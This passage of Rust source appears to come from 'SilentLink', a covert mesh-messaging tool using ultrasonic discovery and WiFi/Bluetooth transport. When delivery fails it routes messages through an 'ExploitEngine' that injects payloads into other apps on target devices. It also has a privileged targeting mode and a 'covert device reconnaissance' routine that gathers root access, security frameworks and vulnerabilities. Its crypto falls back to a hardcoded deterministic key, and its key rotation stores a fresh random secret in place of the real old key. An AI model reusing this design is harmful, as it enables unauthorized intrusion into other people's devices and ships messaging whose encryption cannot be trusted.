            .map_err(|e| SilentLinkError::Crypto(e.to_string()))?;
        
        let message: PlaintextMessage = serde_json::from_slice(&decrypted_payload)?;
        
        Ok(message)
    }

    pub async fn perform_key_exchange(&self, peer_device_id: &DeviceId, peer_public_key: &PublicKey) -> Result<()> {
        // We need to create a new ephemeral secret for the key exchange
        // since diffie_hellman consumes the secret
        let private_key = EphemeralSecret::random_from_rng(OsRng);
        let shared_secret = private_key.diffie_hellman(peer_public_key);
        
        // Derive session key using HKDF
        let hk = Hkdf::<Sha256>::new(None, shared_secret.as_bytes());
        let mut derived_key = [0u8; 32];
        let info = format!("silentlink_session_{}", peer_device_id.0);
        hk.expand(info.as_bytes(), &mut derived_key)
            .map_err(|e| SilentLinkError::Crypto(e.to_string()))?;
        
        // Store session key
        self.session_keys.write().await.insert(peer_device_id.clone(), derived_key);
        
        info!("Key exchange completed with device: {}", peer_device_id);
        Ok(())
    }

    async fn derive_message_key(&self, recipient_id: Option<&DeviceId>) -> Result<[u8; 32]> {
        // Try session key first
        if let Some(device_id) = recipient_id {
            let session_keys = self.session_keys.read().await;
            if let Some(session_key) = session_keys.get(device_id) {
                return Ok(*session_key);
            }
        }

        // Fall back to shared secret
        let secrets = self.shared_secrets.read().await;
        if let Some(secret) = secrets.values().next() {
            let hk = Hkdf::<Sha256>::new(None, &secret.secret);
            let mut derived_key = [0u8; 32];
            
            let info = if let Some(id) = recipient_id {
                format!("silentlink_msg_{}", id.0)
            } else {
                "silentlink_msg_broadcast".to_string()
            };
            
            hk.expand(info.as_bytes(), &mut derived_key)
                .map_err(|e| SilentLinkError::Crypto(e.to_string()))?;
            
            Ok(derived_key)
        } else {
            // Emergency fallback - use a deterministic key
            let mut derived_key = [0u8; 32];
            derived_key[..16].copy_from_slice(b"silentlink_emerg");
            Ok(derived_key)
        }
    }

    pub async fn rotate_keys(&self) -> Result<()> {
        info!("Starting key rotation process");
        
        // Store old keypair temporarily (for transitional decryption)
        let _old_private = self.device_private_key.read().await;
        let old_public = *self.device_public_key.read().await;
        
        // Generate new keypair
        let new_private = EphemeralSecret::random_from_rng(OsRng);
        let new_public = PublicKey::from(&new_private);
        
        // Store old keypair for gradual transition
        *self.old_keypair.write().await = Some((
            // We can't clone EphemeralSecret, so create a new one from same entropy
            EphemeralSecret::random_from_rng(OsRng), 
            old_public
        ));
        
        // Update to new keypair
        *self.device_private_key.write().await = new_private;
        *self.device_public_key.write().await = new_public;
        
        info!("Key rotation completed - old keys stored for transition period");
        
        // Schedule cleanup of old keys after transition period
        let old_keypair_clone = self.old_keypair.clone();
        tokio::spawn(async move {
            tokio::time::sleep(Duration::from_secs(3600)).await; // 1 hour transition
            *old_keypair_clone.write().await = None;
            info!("Old keypair cleaned up after transition period");
        });
        
        Ok(())
    }
}

pub struct MessageRouter {
    device_id: DeviceId,
    crypto_engine: Arc<CryptoEngine>,
    transport_manager: Arc<TransportManager>,
    exploit_engine: Option<Arc<ExploitEngine>>,
    message_cache: Arc<RwLock<HashMap<Uuid, SystemTime>>>,
    routing_table: Arc<RwLock<HashMap<DeviceId, DeviceId>>>,
    neighbor_table: Arc<RwLock<HashMap<DeviceId, SystemTime>>>,
    config: MeshConfig,
    crypto_config: CryptoConfig,
    stats: Arc<RwLock<NetworkStats>>,
}

#[derive(Debug, Default, Clone)]
pub struct NetworkStats {
    pub messages_sent: u64,
    pub messages_received: u64,
    pub messages_forwarded: u64,
    pub messages_dropped: u64,
    pub active_neighbors: usize,
}

impl MessageRouter {
    pub fn new(
        device_id: DeviceId,
        crypto_engine: Arc<CryptoEngine>,
        transport_manager: Arc<TransportManager>,
        config: MeshConfig,
        crypto_config: CryptoConfig,
    ) -> Self {
        Self {
            device_id,
            crypto_engine,
            transport_manager,
            exploit_engine: None, // Will be set later when SilentLink is fully constructed
            message_cache: Arc::new(RwLock::new(HashMap::new())),
            routing_table: Arc::new(RwLock::new(HashMap::new())),
            neighbor_table: Arc::new(RwLock::new(HashMap::new())),
            config,
            crypto_config,
            stats: Arc::new(RwLock::new(NetworkStats::default())),
        }
    }

    /// Set the exploit engine reference after construction
    pub fn set_exploit_engine(&mut self, exploit_engine: Arc<ExploitEngine>) {
        self.exploit_engine = Some(exploit_engine);
    }

    pub async fn start(&self) -> Result<()> {
        // Clone the necessary fields for spawned tasks
        let config_clone = self.config.clone();
        let neighbor_table_clone = self.neighbor_table.clone();
        let stats_clone = self.stats.clone();
        let _device_id_clone = self.device_id.clone();
        
        // Start neighbor cleanup task
        let neighbor_cleanup_task = async move {
            let mut interval = interval(Duration::from_secs(60));

            loop {
                interval.tick().await;
                
                let cutoff = SystemTime::now() - Duration::from_secs(config_clone.neighbour_timeout_seconds);
                let mut neighbor_table = neighbor_table_clone.write().await;
                let old_count = neighbor_table.len();
                
                neighbor_table.retain(|_, last_seen| *last_seen > cutoff);
                
                if neighbor_table.len() != old_count {
                    info!("Cleaned up {} stale neighbors", old_count - neighbor_table.len());
                }

                // Update stats
                stats_clone.write().await.active_neighbors = neighbor_table.len();
            }
        };

        // Start routing update task
        let config_clone2 = self.config.clone();
        let self_clone = self.device_id.clone();
        let neighbor_table_clone2 = self.neighbor_table.clone();
        let crypto_config_clone = self.crypto_config.clone();
        let crypto_engine_clone = self.crypto_engine.clone();
        let stats_clone2 = self.stats.clone();
        let message_cache_clone = self.message_cache.clone();
        let _routing_table_clone = self.routing_table.clone();
        let transport_manager_clone = self.transport_manager.clone();
        
        let routing_update_task = async move {
            let mut interval = interval(Duration::from_millis(config_clone2.routing_update_interval_ms));

            loop {
                interval.tick().await;
                
                // Send topology update to neighbors
                let neighbor_table = neighbor_table_clone2.read().await;
                let neighbors: Vec<String> = neighbor_table.keys().map(|id| id.0.to_string()).collect();
                
                if !neighbors.is_empty() {
                    let mut topology_data = HashMap::new();
                    topology_data.insert(self_clone.0.to_string(), neighbors);
                    
                    if let Ok(topology_json) = serde_json::to_string(&topology_data) {
                        // Create message inline since we can't call self methods
                        let message_id = Uuid::new_v4();
                        
                        let header = MessageHeader {
                            message_id,
                            sender_id: self_clone.clone(),
                            recipient_id: None,
                            message_type: MessageType::TopologyUpdate,
                            ttl: crypto_config_clone.message_ttl_seconds,
                            created_at: SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
                            hop_count: 0,
                            max_hops: (crypto_config_clone.max_hops).try_into().unwrap_or(255),
                        };

                        let mut metadata = HashMap::new();
                        metadata.insert("priority".to_string(), "1".to_string());

                        let plaintext = PlaintextMessage { content: topology_json, metadata };

                        if let Ok(encrypted_message) = crypto_engine_clone
                            .encrypt_message(&plaintext, None, header)
                            .await 
                        {
                            // Route message inline
                            let mut cache = message_cache_clone.write().await;
                            cache.insert(encrypted_message.header.message_id, SystemTime::now());
                            
                            if cache.len() > config_clone2.max_cached_messages {
                                let cutoff = SystemTime::now() - Duration::from_secs(600);
                                cache.retain(|_, timestamp| *timestamp > cutoff);
                            }
                            drop(cache);

                            // Forward to connected devices
                            let connected_devices = transport_manager_clone.get_connected_devices().await;
                            for connected_device in connected_devices.iter().take(3) {
                                let _ = transport_manager_clone.send_message(&connected_device.device_id, &encrypted_message).await;
                            }
                            
                            stats_clone2.write().await.messages_sent += 1;
                        }
                    }
                }
            }
        };

        // Start stats update task
        let stats_clone3 = self.stats.clone();
        let stats_update_task = async move {
            let mut interval = interval(Duration::from_secs(30));

            loop {
                interval.tick().await;
                
                let stats = stats_clone3.read().await;
                info!(
                    "📊 Stats - Sent: {}, Received: {}, Forwarded: {}, Dropped: {}, Neighbors: {}",
                    stats.messages_sent,
                    stats.messages_received,
                    stats.messages_forwarded,
                    stats.messages_dropped,
                    stats.active_neighbors
                );
            }
        };

        tokio::spawn(neighbor_cleanup_task);
        tokio::spawn(routing_update_task);
        tokio::spawn(stats_update_task);

        info!("Message router started");
        Ok(())
    }

    pub async fn send_message(
        &self,
        content: String,
        recipient_id: Option<DeviceId>,
        message_type: MessageType,
        priority: Option<u8>,
    ) -> Result<Uuid> {
        let message_id = Uuid::new_v4();
        
        let header = MessageHeader {
            message_id,
            sender_id: self.device_id.clone(),
            recipient_id: recipient_id.clone(),
            message_type,
            ttl: self.crypto_config.message_ttl_seconds,
            created_at: SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
            hop_count: 0,
            max_hops: (self.crypto_config.max_hops).try_into().unwrap_or(255),
        };

        let mut metadata = HashMap::new();
        if let Some(p) = priority {
            metadata.insert("priority".to_string(), p.to_string());
        }

        // Enhanced flow: Check discovery status and use appropriate delivery method
        if let Some(target_id) = &recipient_id {
            metadata.insert("delivery_flow".to_string(), "enhanced".to_string());
            
            // Check if we have an active high-bandwidth connection (WiFi/BT)
            let connected_devices = self.transport_manager.get_connected_devices().await;
            let has_direct_connection = connected_devices.iter()
                .any(|d| d.device_id == *target_id);
            
            if has_direct_connection {
                info!("Direct connection available for {}, using high-bandwidth transport", target_id);
                metadata.insert("transport_method".to_string(), "direct".to_string());
            } else {
                info!("No direct connection to {}, will attempt discovery then escalation", target_id);
                metadata.insert("transport_method".to_string(), "discovery_escalation".to_string());
            }
        }

        let plaintext = PlaintextMessage { content, metadata };

        let encrypted_message = self
            .crypto_engine
            .encrypt_message(&plaintext, recipient_id.as_ref(), header)
            .await?;

        self.route_message(encrypted_message).await?;
        
        // Update stats
        self.stats.write().await.messages_sent += 1;
        
        Ok(message_id)
    }

    pub async fn route_message(&self, mut message: EncryptedMessage) -> Result<()> {
        // Check for duplicate messages
        {
            let mut cache = self.message_cache.write().await;
            if cache.contains_key(&message.header.message_id) {
                self.stats.write().await.messages_dropped += 1;
                return Ok(());
            }
            
            cache.insert(message.header.message_id, SystemTime::now());
            
            // Cleanup old cache entries
            if cache.len() > self.config.max_cached_messages {
                let cutoff = SystemTime::now() - Duration::from_secs(600);
                cache.retain(|_, timestamp| *timestamp > cutoff);
            }
        }

        // Check TTL
        let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
        if message.header.created_at + message.header.ttl < now {
            self.stats.write().await.messages_dropped += 1;
            return Err(SilentLinkError::MessageExpired);
        }

        // Check hop count
        if message.header.hop_count >= message.header.max_hops {
            warn!("Message {} exceeded max hops, dropping", message.header.message_id);
            self.stats.write().await.messages_dropped += 1;
            return Ok(());
        }

        // Update neighbor table if this is a direct message
        if message.header.hop_count == 0 {
            self.neighbor_table
                .write()
                .await
                .insert(message.header.sender_id.clone(), SystemTime::now());
        }

        // If message is for us, process it
        if let Some(recipient_id) = &message.header.recipient_id {
            if *recipient_id == self.device_id {
                self.stats.write().await.messages_received += 1;
                return self.process_received_message(&message).await;
            }
        } else if matches!(message.header.message_type, MessageType::Broadcast | MessageType::Emergency) {
            // Process broadcast/emergency messages
            self.stats.write().await.messages_received += 1;
            let _ = self.process_received_message(&message).await;
        }

        // Forward the message
        message.header.hop_count += 1;
        self.stats.write().await.messages_forwarded += 1;
        self.forward_message(message).await
    }

    async fn forward_message(&self, message: EncryptedMessage) -> Result<()> {
        let routing_table = self.routing_table.read().await;
        let connected_devices = self.transport_manager.get_connected_devices().await;
        let device_ids: Vec<DeviceId> = connected_devices.iter().map(|d| d.device_id.clone()).collect();

        if let Some(recipient_id) = &message.header.recipient_id {
            // Enhanced delivery flow: Check for discovery-escalation strategy
            if let Ok(plaintext) = self.crypto_engine.decrypt_message(&message).await {
                if let Some(method) = plaintext.metadata.get("transport_method") {
                    if method == "discovery_escalation" {
                        info!("Using discovery-escalation flow for {}", recipient_id);
                        
                        // Step 1: Check if target discovered via ultrasonic but not yet connected
                        let neighbor_table = self.neighbor_table.read().await;
                        if neighbor_table.contains_key(recipient_id) && !device_ids.contains(recipient_id) {
                            info!("Target {} discovered via ultrasonic, attempting transport escalation", recipient_id);
                            
                            // Step 2: Trigger transport manager to establish high-bandwidth connection
                            match self.transport_manager.establish_connection(recipient_id).await {
                                Ok(()) => {
                                    info!("High-bandwidth connection established to {}", recipient_id);
                                    // Now send via direct connection
                                    return self.transport_manager.send_message(recipient_id, &message).await;
                                }
                                Err(e) => {
                                    warn!("⚠️ Transport escalation failed for {}: {}", recipient_id, e);
                                    // Fall back to vector injection
                                    return self.attempt_vector_delivery(&message).await;
                                }
                            }
                        } else if !neighbor_table.contains_key(recipient_id) {
                            info!("Target {} not discovered, message will trigger discovery beacon", recipient_id);
                            // The ultrasonic engine will automatically beacon, and when target responds,
                            // the neighbor_table will be updated, triggering escalation on retry
                        }
                    }
                }
            }

            // Try directed routing for direct connections
            if let Some(next_hop) = routing_table.get(recipient_id) {
                if device_ids.contains(next_hop) {
                    return self.transport_manager.send_message(next_hop, &message).await;
                }
            }
        }

        // Fallback to selective flooding
        let mut sent_count = 0;
        for device_id in device_ids.iter().take(3) { // Limit flooding
            if device_id != &message.header.sender_id { // Don't send back to sender
                if let Ok(()) = self.transport_manager.send_message(device_id, &message).await {
                    sent_count += 1;
                }
            }
        }

        if sent_count > 0 {
            debug!("Message {} forwarded to {} devices", message.header.message_id, sent_count);
        } else {
            warn!("Could not forward message {} - attempting vector delivery as last resort", message.header.message_id);
            return self.attempt_vector_delivery(&message).await;
        }

        Ok(())
    }

    /// Attempt vector delivery when conventional transport fails
    async fn attempt_vector_delivery(&self, message: &EncryptedMessage) -> Result<()> {
        if let Some(exploit_engine) = &self.exploit_engine {
            if let Ok(plaintext) = self.crypto_engine.decrypt_message(message).await {
                // Create vector payload with proper formatting for vector apps
                let payload_data = serde_json::json!({
                    "id": message.header.message_id.to_string(),
                    "content": plaintext.content,
                    "sender": message.header.sender_id.0.to_string(),
                    "timestamp": message.header.created_at,
                    "type": "covert_message",
                    "delivery_method": "vector_injection",
                    "priority": plaintext.metadata.get("priority").unwrap_or(&"1".to_string()).clone()
                });

                let payload = payload_data.to_string().into_bytes();
                
                info!("Attempting covert delivery via vector app injection");
                
                // Use the exploit engine to inject the message
                match exploit_engine.inject_payload_to_apps(&payload).await {
                    Ok(injection_results) => {
                        let successful_injections = injection_results.iter()
                            .filter(|r| r.success)
                            .count();
                        
                        if successful_injections > 0 {
                            info!("Successfully injected message to {} vector apps", successful_injections);
                            return Ok(());
                        } else {
                            warn!("All vector injection attempts failed");
                        }
                    }
                    Err(e) => {
                        warn!("Vector injection failed: {}", e);
                    }
                }
            }
        } else {
            warn!("Vector delivery unavailable - ExploitEngine not initialized");
        }
        
        Err(SilentLinkError::System("All delivery methods exhausted".to_string()))
    }

    async fn process_received_message(&self, message: &EncryptedMessage) -> Result<()> {
        match message.header.message_type {
            MessageType::DirectMessage | MessageType::Broadcast => {
                let plaintext = self.crypto_engine.decrypt_message(message).await?;
                info!(
                    "Message from {}: {}",
                    message.header.sender_id,
                    plaintext.content
                );
                
                // Extract priority if present
                if let Some(priority) = plaintext.metadata.get("priority") {
                    info!("Priority: {}", priority);
                }
            }
            MessageType::Emergency => {
                let plaintext = self.crypto_engine.decrypt_message(message).await?;
                warn!(
                    "🚨 EMERGENCY from {}: {}",
                    message.header.sender_id,
                    plaintext.content
                );
                
                // Emergency messages are automatically rebroadcast with higher TTL
                let rebroadcast_header = MessageHeader {
                    message_id: Uuid::new_v4(),
                    sender_id: self.device_id.clone(),
                    recipient_id: None,
                    message_type: MessageType::Emergency,
                    ttl: message.header.ttl.max(600), // At least 10 minutes
                    created_at: message.header.created_at,
                    hop_count: message.header.hop_count + 1,
                    max_hops: message.header.max_hops.max(10), // Emergency messages go further
                };

                if rebroadcast_header.hop_count < rebroadcast_header.max_hops {
                    let rebroadcast_message = self
                        .crypto_engine
                        .encrypt_message(&plaintext, None, rebroadcast_header)
                        .await?;
                    
                    let _ = self.forward_message(rebroadcast_message).await;
                }
            }
            MessageType::Ping => {
                self.handle_ping(message).await?;
            }
            MessageType::HandshakeRequest => {
                self.handle_handshake_request(message).await?;
            }
            MessageType::KeyExchange => {
                self.handle_key_exchange(message).await?;
            }
            MessageType::TopologyUpdate => {
                self.handle_topology_update(message).await?;
            }
            _ => {
                debug!("Unhandled message type: {:?}", message.header.message_type);
            }
        }

        Ok(())
    }

    async fn handle_ping(&self, ping_message: &EncryptedMessage) -> Result<()> {
        let pong_header = MessageHeader {
            message_id: Uuid::new_v4(),
            sender_id: self.device_id.clone(),
            recipient_id: Some(ping_message.header.sender_id.clone()),
            message_type: MessageType::Pong,
            ttl: 60,
            created_at: SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
            hop_count: 0,
            max_hops: 3,
        };

        let mut metadata = HashMap::new();
        metadata.insert("ping_id".to_string(), ping_message.header.message_id.to_string());

        let pong_content = PlaintextMessage {
            content: "pong".to_string(),
            metadata,
        };

        let encrypted_pong = self
            .crypto_engine
            .encrypt_message(&pong_content, Some(&ping_message.header.sender_id), pong_header)
            .await?;

        self.transport_manager
            .send_message(&ping_message.header.sender_id, &encrypted_pong)
            .await
    }

    async fn handle_handshake_request(&self, message: &EncryptedMessage) -> Result<()> {
        info!("Processing handshake request from {}", message.header.sender_id);
        
        // Send handshake response with our public key
        let response_header = MessageHeader {
            message_id: Uuid::new_v4(),
            sender_id: self.device_id.clone(),
            recipient_id: Some(message.header.sender_id.clone()),
            message_type: MessageType::HandshakeResponse,
            ttl: 60,
            created_at: SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
            hop_count: 0,
            max_hops: 3,
        };

        let mut metadata = HashMap::new();
        let public_key = self.crypto_engine.get_public_key().await;
        metadata.insert(
            "public_key".to_string(),
            hex::encode(public_key.as_bytes()),
        );

        let response_content = PlaintextMessage {
            content: "handshake_response".to_string(),
            metadata,
        };

        let encrypted_response = self
            .crypto_engine
            .encrypt_message(&response_content, Some(&message.header.sender_id), response_header)
            .await?;

        self.transport_manager
            .send_message(&message.header.sender_id, &encrypted_response)
            .await
    }

    async fn handle_key_exchange(&self, message: &EncryptedMessage) -> Result<()> {
        let plaintext = self.crypto_engine.decrypt_message(message).await?;
        
        if let Some(public_key_hex) = plaintext.metadata.get("public_key") {
            if let Ok(public_key_bytes) = hex::decode(public_key_hex) {
                if public_key_bytes.len() == 32 {
                    let mut key_bytes = [0u8; 32];
                    key_bytes.copy_from_slice(&public_key_bytes);
                    let peer_public_key = PublicKey::from(key_bytes);
                    
                    self.crypto_engine
                        .perform_key_exchange(&message.header.sender_id, &peer_public_key)
                        .await?;
                        
                    info!("Key exchange completed with {}", message.header.sender_id);
                }
            }
        }

        Ok(())
    }

    async fn handle_topology_update(&self, message: &EncryptedMessage) -> Result<()> {
        let plaintext = self.crypto_engine.decrypt_message(message).await?;
        
        // Parse topology information and update routing table
        if let Ok(topology_data) = serde_json::from_str::<HashMap<String, Vec<String>>>(&plaintext.content) {
            let mut routing_table = self.routing_table.write().await;
            
            for (device_str, neighbors) in topology_data {
                if let Ok(device_uuid) = Uuid::parse_str(&device_str) {
                    let device_id = DeviceId(device_uuid);
                    
                    // Simple routing: use first neighbor as next hop
                    if let Some(next_hop_str) = neighbors.first() {
                        if let Ok(next_hop_uuid) = Uuid::parse_str(next_hop_str) {
                            let next_hop = DeviceId(next_hop_uuid);
                            routing_table.insert(device_id, next_hop);
                        }
                    }
                }
            }
        }

        debug!("Updated routing table from topology update");
        Ok(())
    }

    pub async fn get_network_stats(&self) -> NetworkStats {
        self.stats.read().await.clone()
    }

    pub async fn get_routing_table(&self) -> HashMap<DeviceId, DeviceId> {
        self.routing_table.read().await.clone()
    }
}

pub struct SilentLink {
    config: SilentLinkConfiguration,
    device_id: DeviceId,
    ultrasonic_engine: UltrasonicEngine,
    transport_manager: Arc<TransportManager>,
    crypto_engine: Arc<CryptoEngine>,
    message_router: Arc<MessageRouter>,
    shared_secrets: Arc<RwLock<HashMap<String, SharedSecret>>>,
    exploit_engine: ExploitEngine,
    platform_adapter: Box<dyn PlatformAdapter + Send + Sync>,
    is_running: Arc<AtomicBool>,
}

impl SilentLink {
    pub async fn new(config: Option<SilentLinkConfiguration>) -> Result<Self> {
        let config = config.unwrap_or_default();
        let device_id = DeviceId::new();
        let shared_secrets = Arc::new(RwLock::new(HashMap::new()));
        
        let ultrasonic_engine = UltrasonicEngine::new(
            config.audio.clone(),
            device_id.clone(),
            shared_secrets.clone(),
        );
        
        // Create transport manager with WiFi fallback
        let transport_manager = Arc::new(
            TransportManager::new(
                config.transport.clone(),
                device_id.clone(),
                config.device_name.clone(),
            )
        );
        
        let crypto_engine = Arc::new(CryptoEngine::new(
            shared_secrets.clone(),
            config.crypto.clone(),
        ));
        
        let mut message_router = MessageRouter::new(
            device_id.clone(),
            crypto_engine.clone(),
            transport_manager.clone(),
            config.mesh.clone(),
            config.crypto.clone(),
        );

        let mut exploit_engine = if config.enable_privileged_mode {
            ExploitEngine::new_with_privileged_access(config.target_device_id.clone())
        } else {
            ExploitEngine::new()
        };

        // Initialize the exploit engine to gather system info
        if let Err(e) = exploit_engine.initialize().await {
            warn!("Failed to initialize exploit engine: {}", e);
        }

        // Wire up the ExploitEngine to the MessageRouter
        let exploit_engine_arc = Arc::new(exploit_engine);
        message_router.set_exploit_engine(exploit_engine_arc.clone());
        let message_router = Arc::new(message_router);

        let config_clone = config.clone();

        Ok(Self {
            config,
            device_id,
            ultrasonic_engine,
            transport_manager,
            crypto_engine,
            message_router,
            shared_secrets,
            exploit_engine: Arc::try_unwrap(exploit_engine_arc).unwrap_or_else(|_arc| {
                // If unwrap fails, create a new instance (shouldn't happen in practice)
                if config_clone.enable_privileged_mode {
                    ExploitEngine::new_with_privileged_access(config_clone.target_device_id.clone())
                } else {
                    ExploitEngine::new()
                }
            }),
            platform_adapter: create_platform_adapter(),
            is_running: Arc::new(AtomicBool::new(false)),
        })
    }

    pub fn device_id(&self) -> &DeviceId {
        &self.device_id
    }

    pub fn device_name(&self) -> &str {
        &self.config.device_name
    }

    pub async fn add_shared_secret(&self, key_id: String, secret: [u8; 32]) {
        let shared_secret = SharedSecret { key_id: key_id.clone(), secret };
        self.shared_secrets.write().await.insert(key_id.clone(), shared_secret);
        info!("Added shared secret: {}", key_id);
    }

    pub async fn add_shared_secret_from_passphrase(&self, key_id: String, passphrase: &str) {
        let secret = SharedSecret::from_passphrase(key_id.clone(), passphrase);
        self.shared_secrets.write().await.insert(key_id.clone(), secret);
        info!("Added shared secret from passphrase: {}", key_id);
    }

    pub async fn start(&self) -> Result<()> {
        if self.is_running.load(Ordering::Acquire) {
            return Ok(());
        }

        info!("Starting SilentLink system - Device: {} ({})", self.config.device_name, self.device_id);

        // Start all subsystems
        let ultrasonic_rx = self.ultrasonic_engine.start().await?;
        let (transport_device_rx, transport_message_rx) = self.transport_manager.start().await?;
        self.message_router.start().await?;

        self.is_running.store(true, Ordering::Release);

        // Start main event loop
        let device_id = self.device_id.clone();
        let transport_manager = self.transport_manager.clone();
        let message_router = self.message_router.clone();
        let is_running = self.is_running.clone();
        
        let event_loop = SilentLinkEventLoop {
            device_id,
            transport_manager,
            message_router,
            is_running,
            ultrasonic_rx,
            transport_device_rx,
            transport_message_rx,
        };

        tokio::spawn(event_loop.run());

        info!("SilentLink system started successfully");
        Ok(())
    }

    pub async fn stop(&self) -> Result<()> {
        if !self.is_running.load(Ordering::Acquire) {
            return Ok(());
        }

        info!("Stopping SilentLink system...");
        
        self.is_running.store(false, Ordering::Release);
        
        self.ultrasonic_engine.stop().await;
        self.transport_manager.stop().await;
        
        info!("SilentLink system stopped");
        Ok(())
    }

    /// Enhanced message sending with discovery-escalation-injection flow
    pub async fn send_message(&self, content: String, recipient_id: Option<DeviceId>) -> Result<Uuid> {
        if !self.is_running.load(Ordering::Acquire) {
            return Err(SilentLinkError::System("System not running".to_string()));
        }

        // Step 1: Try direct high-bandwidth connection first
        if let Some(target_id) = &recipient_id {
            let connected_devices = self.transport_manager.get_connected_devices().await;
            if connected_devices.iter().any(|d| d.device_id == *target_id) {
                info!("Direct high-bandwidth connection available to {}", target_id);
                return self.message_router
                    .send_message(content, recipient_id, MessageType::DirectMessage, None)
                    .await;
            }
            
            info!("No direct connection to {}, initiating enhanced discovery flow", target_id);
        }

        // Step 2: Enhanced flow - attempt discovery → escalation → vector injection
        self.attempt_enhanced_delivery(content, recipient_id).await
    }

    /// Discovery → Escalation → Vector Injection flow
    async fn attempt_enhanced_delivery(&self, content: String, recipient_id: Option<DeviceId>) -> Result<Uuid> {
        if let Some(target_id) = &recipient_id {
            info!("Starting enhanced delivery flow for {}", target_id);
            
            // Step 1: Check if device discovered via ultrasonic but not connected
            let message_router = &self.message_router;
            let neighbor_table = message_router.neighbor_table.read().await;
            
            if neighbor_table.contains_key(target_id) {
                info!("Device {} discovered via ultrasonic beacons", target_id);
                drop(neighbor_table);
                
                // Step 2: Attempt transport escalation (WiFi/BT)
                match self.transport_manager.establish_connection(target_id).await {
                    Ok(()) => {
                        info!("High-bandwidth connection established to {}", target_id);
                        // Step 3: Send via high-bandwidth transport
                        return self.message_router
                            .send_message(content, recipient_id, MessageType::DirectMessage, None)
                            .await;
                    }
                    Err(e) => {
                        warn!("⚠️ Transport escalation failed for {}: {}", target_id, e);
                        // Continue to Step 4: Vector injection
                    }
                }
            } else {
                info!("Device {} not yet discovered, triggering beacon emission", target_id);
                // The ultrasonic engine will automatically emit beacons
                // In a real implementation, you might want to trigger immediate beacon
            }
            
            // Step 4: Covert vector injection as fallback
            info!("Attempting covert delivery via vector app to {}", target_id);
            return self.execute_vector_injection(content, Some(target_id.clone())).await;
        }
        
        // For broadcast messages, use normal routing
        self.message_router
            .send_message(content, recipient_id, MessageType::Broadcast, None)
            .await
    }

    /// Execute vector app injection with enhanced targeting
    async fn execute_vector_injection(&self, content: String, target_device_id: Option<DeviceId>) -> Result<Uuid> {
        let message_id = Uuid::new_v4();
        
        // Create enhanced payload for vector apps
        let payload_data = serde_json::json!({
            "id": message_id.to_string(),
            "content": content,
            "sender": self.device_id.0.to_string(),
            "target": target_device_id.map(|id| id.0.to_string()),
            "timestamp": SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
            "type": "covert_message",
            "delivery_method": "vector_injection",
            "flow": "discovery_escalation_injection",
            "priority": "high"
        });

        let payload = payload_data.to_string().into_bytes();

        // Use exploit engine for vector injection
        match self.exploit_engine.exploit_device(&payload).await {
            Ok(()) => {
                info!("Message delivered via vector injection: {}", message_id);
                Ok(message_id)
            }
            Err(e) => {
                error!("Vector injection failed: {}", e);
                Err(e)
            }
        }
    }



    /// Broadcast message to all discovered devices
    pub async fn send_broadcast(&self, content: String) -> Result<Uuid> {
        if !self.is_running.load(Ordering::Acquire) {
            return Err(SilentLinkError::System("System not running".to_string()));
        }

        info!("Broadcasting message to all devices");
        self.message_router
            .send_message(content, None, MessageType::Broadcast, None)
            .await
    }

    /// Emergency broadcast with maximum propagation
    pub async fn send_emergency(&self, content: String) -> Result<Uuid> {
        info!("Emergency broadcast initiated");
        
        // Use maximum priority and all available vectors
        let message_id = self.message_router
            .send_message(content.clone(), None, MessageType::Emergency, Some(255))
            .await?;
        
        // Also attempt vector injection for maximum reach
        let _ = self.execute_vector_injection(format!("EMERGENCY: {}", content), None).await;
        
        Ok(message_id)
    }

    /// Ping a specific device
    pub async fn ping_device(&self, device_id: DeviceId) -> Result<Uuid> {
        self.message_router
            .send_message("ping".to_string(), Some(device_id), MessageType::Ping, None)
            .await
    }

    /// Get all connected devices
    pub async fn get_connected_devices(&self) -> Vec<DeviceId> {
        self.transport_manager.get_connected_devices().await
            .iter().map(|d| d.device_id.clone()).collect()
    }

    /// Get network statistics
    pub async fn get_network_stats(&self) -> NetworkStats {
        self.message_router.get_network_stats().await
    }

    /// Check if system is running
    pub async fn is_running(&self) -> bool {
        self.is_running.load(Ordering::Acquire)
    }

    /// Direct access to exploit engine for payload injection
    pub async fn inject_payload_to_apps(&self, payload: &[u8]) -> Result<Vec<crate::exploit_engine::InjectionResult>> {
        self.exploit_engine.inject_payload_to_apps(payload).await
    }

    /// Get system and platform information
    pub async fn get_system_info(&self) -> Result<()> {
        if let Some(info) = self.exploit_engine.get_system_info() {
            println!("System Information:");
            println!("Platform: {} {}", info.platform, info.version);
            println!("Architecture: {}", info.architecture);
            println!("Root Access: {}", info.root_access);
            if let Some(kernel) = &info.kernel_version {
                println!("Kernel: {}", kernel);
            }
            if !info.installed_frameworks.is_empty() {
                println!("Security Frameworks: {}", info.installed_frameworks.join(", "));
            }
        }

        let capabilities = self.exploit_engine.get_platform_capabilities();
        if !capabilities.is_empty() {
            println!("Platform Capabilities: {}", capabilities.join(", "));
        }

        Ok(())
    }

    /// Covert device reconnaissance 
    pub async fn reconnaissance_mode(&self) -> Result<()> {
        info!("Starting covert device reconnaissance");

        // Get system information using platform adapter
        let system_info = self.platform_adapter.get_system_info().await?;
        info!("Platform: {} {} ({})", system_info.platform, system_info.version, system_info.architecture);
        info!("Root access: {}", system_info.root_access);
        
        if !system_info.installed_frameworks.is_empty() {
            info!("Security frameworks: {}", system_info.installed_frameworks.join(", "));
        }

        // 1. Passive ultrasonic scanning (extended range)
        info!("Listening for ultrasonic beacons...");
        tokio::time::sleep(Duration::from_secs(30)).await;

        // 2. Transport passive scanning
        info!("Passive transport scanning...");
        let connected_devices = self.transport_manager.get_connected_devices().await;
        let transport_stats = self.transport_manager.get_transport_stats().await;
        info!("Found {} connected devices via {:?} transport", connected_devices.len(), transport_stats.active_transport);
        info!("Transport stats: BT: {}/{}, WiFi: {}/{}", 
              transport_stats.bluetooth_connections, transport_stats.bluetooth_discovered,
              transport_stats.wifi_connections, transport_stats.wifi_discovered);
        
        // Display current transport preference
        match transport_stats.active_transport {
            TransportType::Bluetooth => info!("Active transport: Bluetooth LE"),
            TransportType::WiFi => info!("Active transport: WiFi Direct"),
            TransportType::Hybrid => info!("Active transport: Hybrid (BT + WiFi)"),
        }

        // 3. Device vulnerability assessment
        info!("🎯 Analyzing device vulnerabilities...");
